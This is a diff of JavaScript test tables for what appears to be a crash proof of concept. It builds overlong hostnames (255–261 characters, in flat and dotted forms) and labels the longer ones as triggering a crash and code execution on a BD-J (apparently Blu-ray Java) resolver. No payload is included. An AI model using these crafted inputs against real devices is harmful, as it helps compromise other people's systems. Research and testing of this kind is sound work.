@@ -20,47 +20,78 @@ function hostDotted261Local() {
     + repeatCh('c', 63) + '.' + repeatCh('d', 63) + '.local';
 }
 
+function hostThreeBy63PlusLocal(extraLabelLen) {
+  return repeatCh('x', 63) + '.' + repeatCh('y', 63) + '.'
+    + repeatCh('z', 63) + '.' + repeatCh('q', extraLabelLen) + '.local';
+}
+
 var HOSTS = {
   safe255: {
-    title: 'safe 255 flat',
-    label: '255 flat .local (safe)',
+    label: '255 flat .local (invalid 249-label)',
     host: hostFlat(249),
-    danger: false
+    danger: false,
+    note: 'BD-J baseline safe; label >63'
   },
   safe255Dotted: {
-    title: 'safe 252 dotted',
-    label: '252 dotted .local (safe)',
+    label: '252 dotted .local (valid wire)',
     host: hostDotted255(),
-    danger: false
+    danger: false,
+    note: 'Valid DNS labels'
   },
   safe2554x63: {
-    title: 'safe 255 4x63',
-    label: '255 plain 4x63 (safe)',
+    label: '255 plain 4×63 (valid wire)',
     host: hostFourBy63Plain(),
-    danger: false
+    danger: false,
+    note: 'Best 255 — hits resolver'
   },
   crash256: {
-    title: 'CRASH 256 flat',
-    label: '256 flat .local (CRASH)',
+    label: '256 flat .local (BD-J PoC)',
     host: hostFlat(250),
-    danger: true
+    danger: true,
+    note: '250 C + .local; CE on BD-J'
   },
   crash256Plain: {
-    title: 'CRASH 256 plain',
-    label: '256 plain no suffix (CRASH)',
+    label: '256 plain no suffix',
     host: repeatCh('P', 256),
-    danger: true
+    danger: true,
+    note: 'Single 256-char label'
   },
   crash256Dotted: {
-    title: 'CRASH 261 dotted',
-    label: '261 dotted 4x63+.local (CRASH)',
+    label: '261 dotted 4×63+.local',
     host: hostDotted261Local(),
-    danger: true
+    danger: true,
+    note: 'Valid wire; CE on BD-J bisect'
+  },
+  crash260Dotted: {
+    label: '260 dotted 3×63+62+.local',
+    host: hostThreeBy63PlusLocal(62),
+    danger: true,
+    note: 'Valid wire, 260 total'
   },
   crash256Dual: {
-    title: 'dual 256 iframes',
-    label: '256 flat .local dual iframe',
+    label: '256 flat dual iframe',
     host: hostFlat(250),
-    danger: true
+    danger: true,
+    note: 'pair-dual style'
   }
 };
+
+var INDEX_SECTIONS = [
+  {
+    title: 'Oracles + 255 ghost (no CE)',
+    keys: [],
+    oracle: true
+  },
+  {
+    title: 'Safe 255 — controls',
+    keys: ['safe2554x63', 'safe255Dotted', 'safe255']
+  },
+  {
+    title: 'Crash — try valid wire FIRST (261, 260)',
+    keys: ['crash256Dotted', 'crash260Dotted']
+  },
+  {
+    title: 'Crash — flat 256 (BD-J PoC)',
+    keys: ['crash256', 'crash256Plain']
+  }
+];
